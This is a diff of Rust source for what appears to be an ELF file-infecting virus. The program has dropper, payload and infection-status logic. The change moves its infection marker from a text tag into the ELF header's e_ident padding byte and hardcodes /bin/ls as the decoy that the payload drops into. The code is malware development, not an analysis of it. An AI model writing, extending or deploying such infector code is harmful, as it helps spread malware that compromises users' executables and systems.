@@ -11,13 +11,13 @@ struct Args {
     output_path: String,
 }
 
-const TAG: &str = "viktor var her.";
-
 pub enum InfectionStatus {
     Infected,
     Dropper,
     Origin,
 }
+
+const E_IDENT_START: usize = 0x09 * size_of::<u8>();
 
 pub fn create_dropper() -> Result<(), Box<dyn std::error::Error>> {
     let args = Args::parse();
@@ -44,10 +44,8 @@ pub fn create_dropper() -> Result<(), Box<dyn std::error::Error>> {
 }
 
 pub fn drop_payload() -> Result<(), Box<dyn std::error::Error>> {
-    let args = Args::parse();
-    let decoy_path = &args.decoy_path;
-    let output_path = &args.output_path;
-    assert!(is_elf(decoy_path));
+    let decoy_path = "/bin/ls";
+    let output_path = "ls";
 
     let mut own_contents: Vec<u8> = read(current_exe()?)?;
     let payload_length_offset = own_contents.len() - size_of::<usize>();
@@ -91,16 +89,14 @@ pub fn spawn_infected_program() -> Result<(), Box<dyn std::error::Error>> {
 pub fn get_own_infection_status() -> InfectionStatus {
     let own_path = current_exe().expect("Failed to find my own path...");
     let own_contents = read(&own_path).expect("Failed to open myself...");
+    let tag_location = vec![own_contents[E_IDENT_START]; 1];
 
-    let infect_tag_str = TAG.to_uppercase();
-    let infect_tag = infect_tag_str.as_bytes();
+    let infect_tag = [67];
+    let dropper_tag = [137];
 
-    let dropper_tag_str = make_first_letter_uppercase(TAG);
-    let dropper_tag = dropper_tag_str.as_bytes();
-
-    if is_tag_in_file_buffer(infect_tag, &own_contents) {
+    if is_tag_in_file_buffer(&infect_tag, &tag_location) {
         InfectionStatus::Infected
-    } else if is_tag_in_file_buffer(dropper_tag, &own_contents) {
+    } else if is_tag_in_file_buffer(&dropper_tag, &tag_location) {
         InfectionStatus::Dropper
     } else {
         InfectionStatus::Origin
@@ -108,48 +104,15 @@ pub fn get_own_infection_status() -> InfectionStatus {
 }
 
 fn is_tag_in_file_buffer(tag: &[u8], file_buffer: &[u8]) -> bool {
-    let tag_len = tag.len();
-    file_buffer
-        .windows(tag_len)
-        .any(|window| window == tag)
-}
-
-fn make_first_letter_uppercase(lower_string: &str) -> String {
-    let mut chars = lower_string.chars();
-    match chars.next() {
-        Some(c) => c.to_uppercase().chain(chars).collect(),
-        None => String::new(),
-    }
+    tag == file_buffer
 }
 
 fn set_infected_tag(file_contents: &mut [u8]) {
-    let tag_bytes: &[u8] = TAG.as_bytes();
-    let tag_len = tag_bytes.len();
-    if let Some(tag_index) = file_contents
-        .windows(tag_len)
-        .position(|window| window == tag_bytes)
-    {
-        for byte in file_contents[tag_index..tag_index + tag_len].iter_mut() {
-            if 97 <= *byte && *byte <= 122 {
-                *byte ^= 0x20;
-            }
-        }
-    } else {
-        panic!("Could not find tag in myself!");
-    }
+    file_contents[E_IDENT_START] = 67;
 }
 
 fn set_dropper_tag(file_contents: &mut [u8]) {
-    let tag_bytes: &[u8] = TAG.as_bytes();
-    let tag_len = tag_bytes.len();
-    if let Some(tag_index) = file_contents
-        .windows(tag_len)
-        .position(|window| window == tag_bytes)
-    {
-        file_contents[tag_index] ^= 0x20;
-    } else {
-        panic!("Could not find tag in myself!");
-    }
+    file_contents[E_IDENT_START] = 137;
 }
 
 fn is_elf(file_path: &str) -> bool {
